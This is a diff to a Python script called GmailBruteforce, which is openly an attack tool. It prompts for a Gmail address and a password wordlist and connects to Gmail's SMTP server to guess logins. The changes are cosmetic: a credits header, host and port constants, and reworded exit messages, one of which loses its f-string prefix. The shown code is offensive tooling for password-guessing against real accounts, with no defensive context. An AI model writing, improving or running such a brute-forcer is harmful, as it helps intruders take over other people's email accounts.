@@ -1,5 +1,10 @@
 #!/usr/bin/env python3
 
+# Coding: UTF-8
+# Author: Sarthak2143
+# Source: https://github.com/Sarthak2143/GmailBruteforce
+# License: MIT License
+
 try:
     import smtplib
 
@@ -13,6 +18,7 @@ except:
 import threading
 import sys
 import time
+
 try:
     from colorama import Fore, Style
 
@@ -26,6 +32,9 @@ except:
 threadLock = threading.Lock()
 threads = []
 
+HOST = "smtp.gmail.com"
+PORT = 587
+
 try:
     email = input(f"{Fore.BLUE}[?] Enter email adress:{Style.RESET_ALL} ")
     if email.endswith("@gmail.com"):
@@ -35,7 +44,7 @@ try:
         sys.exit()
 
 except KeyboardInterrupt:
-    print("\nExiting...")
+    print("\n{Fore.BLUE}[-] Exiting...{Style.RESET_ALL}")
     time.sleep(1)
     sys.exit()
 
@@ -44,7 +53,7 @@ try:
     path = input(f"{Fore.BLUE}[?] Enter wordlist path:{Style.RESET_ALL} ")
 
 except KeyboardInterrupt:
-    print("\nExiting...")
+    print(f"\n{Fore.BLUE}[-] Exiting...{Style.RESET_ALL}")
     time.sleep(1)
     sys.exit()
 
@@ -57,7 +66,7 @@ print('Starting bruteforcing...\n')
 def bruteForce():
     global start_time
     start_time = time.time()
-    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+    smtpserver = smtplib.SMTP(HOST, PORT)
     smtpserver.ehlo()
     smtpserver.starttls()
 
